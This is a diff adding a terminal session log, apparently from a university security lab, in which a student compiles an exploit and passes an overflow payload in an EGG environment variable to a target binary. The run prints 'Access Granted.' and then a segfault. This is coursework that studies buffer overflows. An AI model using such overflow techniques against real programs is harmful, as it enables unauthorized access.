@@ -1,0 +1,23 @@
+Script started on Wed 05 Mar 2025 11:21:27 PM UTC
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ gcc task4_exploit.c^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ ./a.out^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ ./t4 $EGG^M
+arg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¤<85>^D^HEGG=^M
+^M
+-=-=-=-=-=-=-=-=-=-=-=-=-=-^M
+ Access Granted.^M
+-=-=-=-=-=-=-=-=-=-=-=-=-=-^M
+Segmentation fault (core dumped)^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ exit^M
+exit^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ quit^M
+No command 'quit' found, did you mean:^M
+ Command 'quilt' from package 'quilt' (main)^M
+ Command 'quiz' from package 'bsdgames' (universe)^M
+ Command 'luit' from package 'x11-utils' (main)^M
+ Command 'quot' from package 'quota' (main)^M
+ Command 'qgit' from package 'qgit' (universe)^M
+quit: command not found^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ ^C^M
+^[]0;vagrant@vagrant-ubuntu-trusty-32: ~/csci461-lab-2^Gvagrant@vagrant-ubuntu-trusty-32:~/csci461-lab-2$ exit
+Script done on Wed 05 Mar 2025 11:22:43 PM UTC
